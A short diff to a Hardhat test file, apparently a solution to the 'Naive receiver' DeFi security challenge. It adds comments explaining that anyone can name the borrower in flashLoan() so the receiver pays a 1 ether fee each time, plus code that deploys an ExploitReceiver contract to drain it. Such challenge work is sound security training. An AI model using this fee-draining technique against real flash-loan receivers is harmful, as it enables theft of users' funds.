@@ -30,7 +30,13 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        // The bug is that we can take a flash loan out for the receiver
+        // by specifying the borrower in the flashLoan() function. Each
+        // transaction takes a fee of 1 ether, so just do the transaction 10
+        // times (see ExploitReceiver.sol)
+        const ExploitReceiverFactory = await ethers.getContractFactory('ExploitReceiver', attacker);
+        this.attackerContract = await ExploitReceiverFactory.deploy();
+        await this.attackerContract.exploit();
     });
 
     after(async function () {
